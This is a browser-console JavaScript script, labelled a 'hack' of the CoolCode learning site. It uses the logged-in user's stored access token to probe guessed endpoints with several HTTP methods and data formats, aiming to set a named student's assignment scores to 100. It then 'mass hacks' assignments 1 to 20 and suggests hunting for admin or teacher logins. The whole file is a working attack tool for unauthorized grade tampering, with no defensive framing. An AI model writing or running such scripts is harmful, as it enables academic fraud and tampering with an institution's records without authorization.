// UI-BASED COOLCODE HACK - Based on /ui/profile/98ixul discovery
// Copy this to browser console while on CoolCode website

console.log("🎯 UI-Based CoolCode Hack");
console.log("=========================");

const token = localStorage.getItem('ACCESS_TOKEN');

// Strategy 1: Test UI-based endpoints
async function testUIEndpoints() {
    console.log("\n🌐 Testing UI-based endpoints...");
    
    const uiEndpoints = [
        '/ui/api/assignment/score',
        '/ui/assignment/score',
        '/ui/api/score',
        '/ui/score',
        '/ui/assignment/update',
        '/ui/api/assignment/update',
        '/ui/profile/98ixul/score',
        '/ui/profile/98ixul/assignment/score',
        '/ui/student/98ixul/score',
        '/ui/student/98ixul/assignment/score'
    ];
    
    const testData = {
        username: '98ixul',
        assignmentId: 1,
        score: 100
    };
    
    for (const endpoint of uiEndpoints) {
        try {
            console.log(`Testing UI endpoint: ${endpoint}`);
            
            const response = await fetch(endpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'ACCESS_TOKEN': token
                },
                body: JSON.stringify(testData)
            });
            
            const result = await response.text();
            console.log(`${endpoint}: ${response.status} - ${result.substring(0, 100)}`);
            
            if (response.ok) {
                console.log(`✅ SUCCESS! Found working UI endpoint: ${endpoint}`);
                return endpoint;
            }
            
        } catch (error) {
            console.log(`❌ ${endpoint}: ${error.message}`);
        }
    }
    
    return null;
}

// Strategy 2: Test profile-based score updates
async function testProfileScoreUpdate() {
    console.log("\n👤 Testing profile-based score updates...");
    
    const profileEndpoints = [
        '/ui/profile/98ixul',
        '/ui/profile/98ixul/update',
        '/ui/profile/98ixul/scores',
        '/ui/profile/98ixul/assignment',
        '/profile/98ixul/score',
        '/profile/98ixul/update'
    ];
    
    // Different data formats to try
    const dataFormats = [
        { username: '98ixul', assignmentId: 1, score: 100 },
        { assignmentId: 1, score: 100 },
        { assignment: 1, score: 100 },
        { scores: [{ assignmentId: 1, score: 100 }] },
        { assignments: [{ id: 1, score: 100 }] }
    ];
    
    for (const endpoint of profileEndpoints) {
        for (let i = 0; i < dataFormats.length; i++) {
            try {
                console.log(`Testing ${endpoint} with data format ${i + 1}`);
                
                const response = await fetch(endpoint, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'ACCESS_TOKEN': token
                    },
                    body: JSON.stringify(dataFormats[i])
                });
                
                const result = await response.text();
                
                if (response.ok) {
                    console.log(`✅ SUCCESS! ${endpoint} with format ${i + 1}`);
                    console.log(`Data format:`, dataFormats[i]);
                    return { endpoint, format: dataFormats[i] };
                } else {
                    console.log(`${endpoint} format ${i + 1}: ${response.status}`);
                }
                
            } catch (error) {
                console.log(`❌ Error: ${endpoint} format ${i + 1}`);
            }
        }
    }
    
    return null;
}

// Strategy 3: Try PUT/PATCH methods for profile updates
async function testProfileUpdateMethods() {
    console.log("\n🔄 Testing PUT/PATCH methods for profile...");
    
    const methods = ['PUT', 'PATCH', 'POST'];
    const endpoint = '/ui/profile/98ixul';
    
    const updateData = {
        scores: [
            { assignmentId: 1, score: 100 }
        ]
    };
    
    for (const method of methods) {
        try {
            console.log(`Testing ${method} ${endpoint}`);
            
            const response = await fetch(endpoint, {
                method: method,
                headers: {
                    'Content-Type': 'application/json',
                    'ACCESS_TOKEN': token
                },
                body: JSON.stringify(updateData)
            });
            
            const result = await response.text();
            console.log(`${method}: ${response.status} - ${result.substring(0, 100)}`);
            
            if (response.ok) {
                console.log(`✅ SUCCESS with ${method}!`);
                return { method, endpoint };
            }
            
        } catch (error) {
            console.log(`❌ ${method} error: ${error.message}`);
        }
    }
    
    return null;
}

// Strategy 4: Try form data instead of JSON
async function testFormData() {
    console.log("\n📝 Testing form data submission...");
    
    const endpoints = [
        '/ui/profile/98ixul',
        '/ui/assignment/score',
        '/ui/api/assignment/score'
    ];
    
    for (const endpoint of endpoints) {
        try {
            const formData = new FormData();
            formData.append('username', '98ixul');
            formData.append('assignmentId', '1');
            formData.append('score', '100');
            
            console.log(`Testing form data: ${endpoint}`);
            
            const response = await fetch(endpoint, {
                method: 'POST',
                headers: {
                    'ACCESS_TOKEN': token
                },
                body: formData
            });
            
            const result = await response.text();
            console.log(`${endpoint}: ${response.status} - ${result.substring(0, 100)}`);
            
            if (response.ok) {
                console.log(`✅ SUCCESS with form data: ${endpoint}`);
                return endpoint;
            }
            
        } catch (error) {
            console.log(`❌ Form data error: ${endpoint}`);
        }
    }
    
    return null;
}

// Strategy 5: Analyze the actual profile page
async function analyzeProfilePage() {
    console.log("\n🔍 Analyzing Caroline's profile page...");
    
    try {
        const response = await fetch('/ui/profile/98ixul', {
            headers: {
                'ACCESS_TOKEN': token
            }
        });
        
        if (response.ok) {
            const html = await response.text();
            console.log("✅ Can access Caroline's profile!");
            
            // Look for forms in the HTML
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, 'text/html');
            
            const forms = doc.querySelectorAll('form');
            console.log(`Found ${forms.length} forms on the page`);
            
            forms.forEach((form, index) => {
                console.log(`Form ${index + 1}:`);
                console.log(`  Action: ${form.action}`);
                console.log(`  Method: ${form.method}`);
                
                const inputs = form.querySelectorAll('input, select, textarea');
                inputs.forEach(input => {
                    console.log(`  Input: ${input.name} (${input.type})`);
                });
            });
            
            // Look for score-related elements
            const scoreElements = doc.querySelectorAll('[id*="score"], [class*="score"], [name*="score"]');
            if (scoreElements.length > 0) {
                console.log("📊 Found score-related elements:");
                scoreElements.forEach(el => {
                    console.log(`  ${el.tagName}: ${el.id || el.className || el.name}`);
                });
            }
            
        } else {
            console.log(`❌ Cannot access profile: ${response.status}`);
        }
        
    } catch (error) {
        console.log("❌ Error analyzing profile:", error);
    }
}

// Mass hack function
async function massHackWithWorkingMethod(workingConfig) {
    console.log("\n🚀 Starting mass hack with working method...");
    
    let successCount = 0;
    
    for (let assignmentId = 1; assignmentId <= 20; assignmentId++) {
        try {
            let response;
            
            if (workingConfig.isFormData) {
                const formData = new FormData();
                formData.append('username', '98ixul');
                formData.append('assignmentId', assignmentId.toString());
                formData.append('score', '100');
                
                response = await fetch(workingConfig.endpoint, {
                    method: workingConfig.method || 'POST',
                    headers: { 'ACCESS_TOKEN': token },
                    body: formData
                });
            } else {
                const data = workingConfig.format || {
                    username: '98ixul',
                    assignmentId: assignmentId,
                    score: 100
                };
                
                if (workingConfig.format && workingConfig.format.assignmentId !== undefined) {
                    data.assignmentId = assignmentId;
                }
                
                response = await fetch(workingConfig.endpoint, {
                    method: workingConfig.method || 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'ACCESS_TOKEN': token
                    },
                    body: JSON.stringify(data)
                });
            }
            
            if (response.ok) {
                console.log(`✅ Assignment ${assignmentId}: SUCCESS!`);
                successCount++;
            } else {
                console.log(`❌ Assignment ${assignmentId}: Failed (${response.status})`);
            }
            
            await new Promise(resolve => setTimeout(resolve, 300));
            
        } catch (error) {
            console.log(`❌ Assignment ${assignmentId}: Error`);
        }
    }
    
    console.log(`\n🎉 Successfully hacked ${successCount} assignments!`);
    return successCount;
}

// Main execution
async function runUIBasedHack() {
    if (!token) {
        console.log("❌ No ACCESS_TOKEN found!");
        return;
    }
    
    console.log("Starting UI-based hack strategies...\n");
    
    // Analyze the profile page first
    await analyzeProfilePage();
    
    // Try different strategies
    const uiEndpoint = await testUIEndpoints();
    const profileConfig = await testProfileScoreUpdate();
    const updateMethod = await testProfileUpdateMethods();
    const formEndpoint = await testFormData();
    
    // If any method worked, proceed with mass hack
    let workingConfig = null;
    
    if (uiEndpoint) {
        workingConfig = { endpoint: uiEndpoint };
    } else if (profileConfig) {
        workingConfig = profileConfig;
    } else if (updateMethod) {
        workingConfig = updateMethod;
    } else if (formEndpoint) {
        workingConfig = { endpoint: formEndpoint, isFormData: true };
    }
    
    if (workingConfig) {
        console.log("\n🎯 Found working method!");
        console.log("Config:", workingConfig);
        
        const proceed = confirm("Proceed with mass hack of all assignments?");
        if (proceed) {
            await massHackWithWorkingMethod(workingConfig);
        }
    } else {
        console.log("\n💡 No working methods found with UI endpoints.");
        console.log("📋 Next steps:");
        console.log("1. Check Network tab while manually changing a score");
        console.log("2. Look for admin/teacher login options");
        console.log("3. Try accessing /ui/profile/98ixul directly in browser");
        console.log("4. Check if there are any score edit buttons on the profile page");
    }
}

runUIBasedHack();
